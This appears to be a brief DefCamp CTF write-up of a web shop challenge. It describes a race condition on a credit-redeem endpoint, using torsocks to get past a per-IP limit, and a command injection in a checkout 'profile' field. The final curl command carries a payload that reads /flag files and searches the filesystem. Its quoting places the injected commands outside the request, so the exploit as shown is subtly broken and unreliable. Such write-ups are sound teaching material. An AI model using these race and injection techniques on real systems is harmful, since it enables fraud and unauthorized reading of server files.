# defcamp supply writeup

## reconnaissance 
# i started by examining the given web app and found out that we can get 2 credits per day and we can purchase a lot of items, but we don't have enough for that and i got the idea of race conditions of 2 bonus credits. after examining the sources, i figured out that we have a command injection in build profile field when buying zero day debugger, but we didn't have enough credits to buy it

## initial access and getting the flag
# i tried to make a script to test whether race conditions are possible :
# I ran 3 times in parallel (adding session cookies) curl -X POST 'http://136.92.7.211:32488/redeem' and got 10 tokens. so, i added the number of times i ran those in parallel and reached the maximum of 18 tokens. even when i tried to do 20 concurrent request , i could get only 10. so i came up with a solution of running from 2 different IP's at the same time , but with the same session cookie. i used torsocks for that and it happened - i got more than 20 tokens. after that , i simply ran curl -s -b "cookie" -X POST "http://136.92.7.211:30277/checkout" \
#  --data-urlencode "item_id=zero_day_debugger" \
#  --data-urlencode "quantity=1" \
# --data-urlencode "profile=x"; (cat /flag* 2>/dev/null; cat /app/flag* 2>/dev/null; find / -maxdepth 4 -iname "flag*" -exec cat {} \; 2>/dev/null); echo "" 
   
